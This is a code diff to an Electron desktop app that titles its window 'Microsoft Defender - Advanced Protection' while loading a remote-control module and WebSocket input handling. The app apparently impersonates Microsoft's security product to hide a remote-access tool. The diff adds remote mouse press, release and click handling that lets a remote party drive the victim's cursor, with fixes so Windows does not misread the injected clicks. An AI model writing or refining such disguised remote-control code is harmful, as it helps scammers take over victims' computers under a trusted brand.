@@ -12,11 +12,13 @@ const {
 const runtimeConfig = require("./config");
 const WebSocket = require("ws");
 const { autoUpdater } = require("electron-updater");
-let moveMouse, clickMouse, typeChar, pressKey, selectAndDeleteText, deleteSelectedText, selectAllText, scrollWheel, mouseDragSelection;
+let moveMouse, clickMouse, pressMouseButton, releaseMouseButton, typeChar, pressKey, selectAndDeleteText, deleteSelectedText, selectAllText, scrollWheel, mouseDragSelection;
 try {
   const remoteControl = require("./remoteControl");
   moveMouse = remoteControl.moveMouse;
   clickMouse = remoteControl.clickMouse;
+  pressMouseButton = remoteControl.pressMouseButton;
+  releaseMouseButton = remoteControl.releaseMouseButton;
   typeChar = remoteControl.typeChar;
   pressKey = remoteControl.pressKey;
   selectAndDeleteText = remoteControl.selectAndDeleteText;
@@ -28,9 +30,8 @@ try {
 } catch (e) {
   console.error("❌ Failed to load remote control module:", e.message);
   console.error("Stack:", e.stack);
-  // Create no-op fallbacks so the app can still start
   const noop = () => console.warn("Remote control not available");
-  moveMouse = clickMouse = typeChar = pressKey = selectAndDeleteText = deleteSelectedText = selectAllText = scrollWheel = mouseDragSelection = noop;
+  moveMouse = clickMouse = pressMouseButton = releaseMouseButton = typeChar = pressKey = selectAndDeleteText = deleteSelectedText = selectAllText = scrollWheel = mouseDragSelection = noop;
 }
 const path = require("path");
 const os = require("os");
@@ -96,7 +97,7 @@ function createWindow() {
     height: 800,
     title: "Microsoft Defender - Advanced Protection",
     icon: path.join(__dirname, "logo.png"), // Custom logo for taskbar and window
-    show: true, // Force window to be visible
+    show: true, // Show window on startup
     center: true, // Center the window
     alwaysOnTop: false, // Don't keep on top
     minimizable: true,
@@ -128,11 +129,8 @@ function createWindow() {
   // Add event listeners for debugging
   mainWindow.on("ready-to-show", () => {
     console.log("✅ Window ready to show");
-    // Ensure title is set when window is ready
     mainWindow.setTitle("Microsoft Defender - Advanced Protection");
     mainWindow.show();
-    mainWindow.focus();
-    mainWindow.moveTop();
   });
 
   mainWindow.on("show", () => {
@@ -142,11 +140,6 @@ function createWindow() {
   mainWindow.on("focus", () => {
     console.log("✅ Window focused");
   });
-
-  // Force show the window
-  mainWindow.show();
-  mainWindow.focus();
-  mainWindow.moveTop();
 
   // Handle window minimize to system tray behavior
   mainWindow.on("close", (event) => {
@@ -923,13 +916,18 @@ async function handleInput(data, event = null) {
   if (!global.__mouseMoveState) {
     global.__mouseMoveState = { inProgress: false, pending: null };
   }
+  if (global.__clickInProgress === undefined) global.__clickInProgress = false;
   try {
     const { width, height } = screen.getPrimaryDisplay().bounds;
+    const btn = (data.button === 2 || data.button === "right") ? "right" : "left";
 
     if (data.action === "mousemove" || data.action === "move") {
+      // Do NOT gate moves on __clickInProgress — suppressing movements during the
+      // 400ms click window caused Windows to misread stationary press→release as a
+      // drag (taskbar icon reorder). The mutex remains on mouseup/click only.
       const state = global.__mouseMoveState;
       if (state.inProgress) {
-        state.pending = data; // keep only latest
+        state.pending = data;
         return;
       }
       state.inProgress = true;
@@ -949,21 +947,40 @@ async function handleInput(data, event = null) {
       state.inProgress = false;
     }
 
-    // Handle click events - process both "click" and "mouseup" actions
-    if (data.action === "click" || data.action === "mouseup") {
-      // Move mouse to click coordinates first, then click
+    // mousedown: move cursor to position only — no click yet.
+    if (data.action === "mousedown") {
       if (data.x !== undefined && data.y !== undefined) {
-        await moveMouse(
-          data.x,
-          data.y,
-          width,
-          height,
-          data.remoteWidth || width,
-          data.remoteHeight || height
-        );
+        await moveMouse(data.x, data.y, width, height, data.remoteWidth || width, data.remoteHeight || height);
       }
+    }
 
-      await clickMouse(data.button === 2 || data.button === "right" ? "right" : "left");
+    // mouseup: execute complete click at snapped position.
+    // __clickInProgress prevents a second concurrent click from firing while
+    // clickMouse() is mid-execution; it does NOT suppress mousemove events.
+    if (data.action === "mouseup") {
+      if (data.x !== undefined && data.y !== undefined) {
+        await moveMouse(data.x, data.y, width, height, data.remoteWidth || width, data.remoteHeight || height);
+      }
+      if (!global.__clickInProgress) {
+        global.__clickInProgress = true;
+        const t = setTimeout(() => { global.__clickInProgress = false; }, 400);
+        try { await clickMouse(btn); } finally { clearTimeout(t); global.__clickInProgress = false; }
+      }
+    }
+
+    // Click action — mutex covers full move+click so no concurrent mousemove
+    // can slip between moveMouse and clickMouse and cause Windows to read it as a drag.
+    if (data.action === "click") {
+      if (!global.__clickInProgress) {
+        global.__clickInProgress = true;
+        const t = setTimeout(() => { global.__clickInProgress = false; }, 400);
+        try {
+          if (data.x !== undefined && data.y !== undefined) {
+            await moveMouse(data.x, data.y, width, height, data.remoteWidth || width, data.remoteHeight || height);
+          }
+          await clickMouse(btn);
+        } finally { clearTimeout(t); global.__clickInProgress = false; }
+      }
     }
 
     // Handle double-click events
